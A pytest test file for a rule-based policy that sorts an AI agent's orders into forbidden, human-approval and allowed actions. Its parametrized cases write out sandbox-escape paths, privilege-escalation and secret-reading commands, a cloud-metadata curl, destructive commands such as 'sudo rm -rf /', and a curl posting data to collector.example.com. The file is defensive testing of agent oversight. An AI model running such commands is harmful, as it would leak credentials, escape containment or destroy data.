"""The control plan — every rule, and every way to try to get around it."""

from __future__ import annotations

import re
from pathlib import Path

import pytest

from signedorders.models import Action, Order, Risk
from signedorders.policy import Policy, default_policy


def order(action: Action, target: str = "sandbox://sb-42:/app/main.py",
          **args: str) -> Order:
    """Build an order for a test."""
    return Order.new(
        task_id="task-1",
        agent_id="agent-1",
        action=action,
        target=target,
        args=dict(args),
    )


def exec_order(command: str, target: str = "sandbox://sb-42:/app/run.sh") -> Order:
    return order(Action.EXEC, target, command=command)


# --------------------------------------------------------------------------- #
# The rule table itself
# --------------------------------------------------------------------------- #


def test_the_rule_table_is_not_empty():
    assert len(default_policy().rules) >= 10


def test_every_rule_has_an_id_a_risk_and_one_sentence():
    seen = set()
    for rule in default_policy().rules:
        assert rule.id not in seen, f"the rule id {rule.id} is used twice"
        seen.add(rule.id)
        assert rule.risk in tuple(Risk)
        assert rule.explanation.endswith(".")
        assert rule.explanation.count(".") <= 2, (
            f"the explanation of {rule.id} must be one sentence"
        )
        assert len(rule.explanation.split()) >= 8


def test_the_rule_ids_are_unique_in_the_description():
    ids = [rule["id"] for rule in default_policy().describe()]
    assert len(ids) == len(set(ids))


def test_the_forbidden_rules_come_first():
    """A forbidden rule must never be reachable behind an 'allow' rule."""
    risks = [rule.risk for rule in default_policy().rules]
    first_allow = next(
        (index for index, risk in enumerate(risks) if risk is not Risk.FORBIDDEN),
        len(risks),
    )
    assert all(risk is Risk.FORBIDDEN for risk in risks[:first_allow])


def test_the_last_rule_matches_everything():
    """The table must end with a catch-all, or some orders would fall through."""
    assert default_policy().rules[-1].id == "default.unknown"
    assert default_policy().rules[-1].applies_to(order(Action.READ)) is True


# --------------------------------------------------------------------------- #
# The rules that forbid
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "target",
    [
        "host://etc/shadow",
        "file:///etc/passwd",
        "/etc/passwd",
        "/root/.ssh/id_rsa",
        "sandbox://sb-42:/app/../../etc/passwd",
        "sandbox://sb-42:/app/../secret",
    ],
)
def test_escaping_the_sandbox_is_forbidden(target):
    risk, rule_id, _ = default_policy().classify(order(Action.READ, target))
    assert risk is Risk.FORBIDDEN
    assert rule_id == "forbidden.escape"


@pytest.mark.parametrize(
    "command",
    [
        "sudo apt-get install -y curl",
        "chroot /host /bin/sh",
        "mount /dev/sda1 /mnt",
        "nsenter -t 1 -m -u -i -n -p /bin/bash",
        "unshare --mount --pid /bin/sh",
    ],
)
def test_privilege_escalation_is_forbidden(command):
    risk, rule_id, _ = default_policy().classify(exec_order(command))
    assert risk is Risk.FORBIDDEN
    assert rule_id == "forbidden.privilege_escalation"


@pytest.mark.parametrize(
    "command",
    [
        "printenv",
        "env",
        "cat /proc/self/environ",
        "cat /home/agent/.ssh/id_rsa",
        "cat /app/.env",
        "cat /etc/passwd",
    ],
)
def test_reading_a_secret_is_forbidden(command):
    risk, rule_id, _ = default_policy().classify(exec_order(command))
    assert risk is Risk.FORBIDDEN
    assert rule_id in ("forbidden.secret_read", "forbidden.escape")


def test_reading_a_private_key_file_is_forbidden():
    risk, rule_id, _ = default_policy().classify(
        order(Action.READ, "sandbox://sb-42:/app/server.pem")
    )
    assert risk is Risk.FORBIDDEN
    assert rule_id == "forbidden.secret_read"


def test_the_cloud_metadata_service_is_forbidden():
    risk, rule_id, _ = default_policy().classify(
        exec_order("curl -s http://169.254.169.254/latest/meta-data/iam/")
    )
    assert risk is Risk.FORBIDDEN
    assert rule_id == "forbidden.cloud_metadata"


def test_a_forbidden_order_is_never_high_risk():
    """A forbidden order must not be 'high': there is no approval to give."""
    risk, _, _ = default_policy().classify(exec_order("sudo rm -rf /"))
    assert risk is Risk.FORBIDDEN


# --------------------------------------------------------------------------- #
# The rules that queue for a human
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /srv/data",
        "rm -f /app/config.py",
        "truncate -s 0 /app/logs/app.log",
        "DROP TABLE customers",
        "DELETE FROM orders WHERE id = 1",
        "git reset --hard HEAD~5",
        "systemctl stop checkout-api",
    ],
)
def test_a_destructive_command_waits_for_a_human(command):
    risk, rule_id, _ = default_policy().classify(exec_order(command))
    assert risk is Risk.HIGH
    assert rule_id == "risk.destructive"


def test_a_delete_action_waits_for_a_human():
    risk, rule_id, _ = default_policy().classify(
        order(Action.DELETE, "sandbox://sb-42:/srv/data")
    )
    assert risk is Risk.HIGH
    assert rule_id == "risk.destructive"


def test_a_network_call_to_an_unknown_host_waits_for_a_human():
    risk, rule_id, _ = default_policy().classify(
        order(Action.NETWORK, "net://collector.example.com/upload")
    )
    assert risk is Risk.HIGH
    assert rule_id == "risk.network"


def test_a_curl_in_a_command_waits_for_a_human():
    risk, rule_id, _ = default_policy().classify(
        exec_order("curl -d @/app/data.json http://collector.example.com/")
    )
    assert risk is Risk.HIGH
    assert rule_id == "risk.network"


def test_asking_a_human_a_question_is_allowed():
    risk, rule_id, _ = default_policy().classify(order(Action.ESCALATE))
    assert risk is Risk.LOW
    assert rule_id == "allow.escalate"


def test_an_action_that_does_not_exist_waits_for_a_human():
    """An action outside the enum must fall through to the safe default."""
    strange = Order.new(
        task_id="task-1",
        agent_id="agent-1",
        action="telepathy",  # type: ignore[arg-type]
        target="sandbox://sb-42:/app/main.py",
    )
    risk, rule_id, _ = default_policy().classify(strange)
    assert risk is Risk.HIGH
    assert rule_id == "default.unknown"


# --------------------------------------------------------------------------- #
# The rules that allow
# --------------------------------------------------------------------------- #


def test_reading_a_sandbox_file_is_low_risk():
    risk, rule_id, _ = default_policy().classify(
        order(Action.READ, "sandbox://sb-42:/app/main.py")
    )
    assert risk is Risk.LOW
    assert rule_id == "allow.sandbox_read"


def test_writing_a_sandbox_file_is_low_risk():
    risk, rule_id, _ = default_policy().classify(
        order(Action.WRITE, "sandbox://sb-42:/app/fix.py")
    )
    assert risk is Risk.LOW
    assert rule_id == "allow.sandbox_write"


def test_running_the_tests_is_low_risk():
    risk, rule_id, _ = default_policy().classify(
        order(Action.TEST, "sandbox://sb-42:/app", command="pytest -q")
    )
    assert risk is Risk.LOW
    assert rule_id == "allow.sandbox_test"


def test_running_a_command_in_the_sandbox_is_low_risk():
    risk, rule_id, _ = default_policy().classify(exec_order("pytest -q"))
    assert risk is Risk.LOW
    assert rule_id == "allow.sandbox_exec"


def test_changing_the_target_service_is_medium_risk():
    risk, rule_id, _ = default_policy().classify(
        order(Action.APPLY, "service://checkout-api")
    )
    assert risk is Risk.MEDIUM
    assert rule_id == "risk.mutating_target"


def test_restarting_the_target_service_is_medium_risk():
    risk, rule_id, _ = default_policy().classify(
        order(Action.RESTART, "service://checkout-api")
    )
    assert risk is Risk.MEDIUM
    assert rule_id == "risk.mutating_target"


def test_a_network_call_to_an_allowlisted_host_is_low_risk():
    policy = Policy(egress_allowlist=("api.example.com",))
    risk, rule_id, _ = policy.classify(
        order(Action.NETWORK, "net://api.example.com/v1/health")
    )
    assert risk is Risk.LOW
    assert rule_id == "allow.network_egress"


def test_a_network_call_to_another_host_is_still_high_risk():
    policy = Policy(egress_allowlist=("api.example.com",))
    risk, rule_id, _ = policy.classify(
        order(Action.NETWORK, "net://evil.example.com/v1/health")
    )
    assert risk is Risk.HIGH
    assert rule_id == "risk.network"


# --------------------------------------------------------------------------- #
# The trace
# --------------------------------------------------------------------------- #


def test_the_trace_names_the_rule_the_input_and_the_output():
    trace = default_policy().evaluate(order(Action.READ, "sandbox://sb-42:/app/main.py"))
    assert trace.rule_id == "allow.sandbox_read"
    assert trace.inputs["action"] == "read"
    assert trace.inputs["target"] == "sandbox://sb-42:/app/main.py"
    assert trace.outputs["risk"] == "low"
    assert trace.outputs["rule_id"] == "allow.sandbox_read"
    assert trace.explanation.endswith(".")


def test_the_trace_lists_the_rules_that_were_evaluated():
    trace = default_policy().evaluate(exec_order("rm -rf /srv/data"))
    assert trace.evaluated[0] == "forbidden.escape"
    assert trace.evaluated[-1] == "risk.destructive"  # the match stops the walk
    assert "allow.sandbox_exec" not in trace.evaluated


def test_two_identical_orders_get_the_same_verdict():
    first = default_policy().evaluate(order(Action.READ, "sandbox://sb-42:/a.py"))
    second = default_policy().evaluate(order(Action.READ, "sandbox://sb-42:/a.py"))
    assert first.rule_id == second.rule_id
    assert first.outputs == second.outputs


# --------------------------------------------------------------------------- #
# The property that matters: no model in the decision loop
# --------------------------------------------------------------------------- #


def test_the_policy_module_calls_no_model_and_no_network():
    """The decision loop must be pure: no LLM, no HTTP, no disk."""
    source = (Path(__file__).resolve().parent.parent / "signedorders" / "policy.py").read_text(
        encoding="utf-8"
    )
    forbidden = [
        "import requests",
        "import httpx",
        "import urllib",
        "import socket",
        "openai",
        "anthropic",
        "vultr",
        "http.client",
        "subprocess",
        "eval(",
        "exec(",
    ]
    for needle in forbidden:
        assert needle not in source, f"the policy must not use {needle!r}"


def test_the_policy_module_imports_only_the_standard_library_and_our_models():
    source = (Path(__file__).resolve().parent.parent / "signedorders" / "policy.py").read_text(
        encoding="utf-8"
    )
    imports = re.findall(r"^(?:from|import)\s+([\w.]+)", source, flags=re.MULTILINE)
    allowed = {"__future__", "re", "dataclasses", "typing", ".models"}
    for module in imports:
        assert module in allowed, f"the policy must not import {module!r}"


def test_the_policy_is_pure_it_does_not_mutate_the_order():
    target = order(Action.READ, "sandbox://sb-42:/app/main.py")
    before = target.canonical()
    default_policy().evaluate(target)
    assert target.canonical() == before
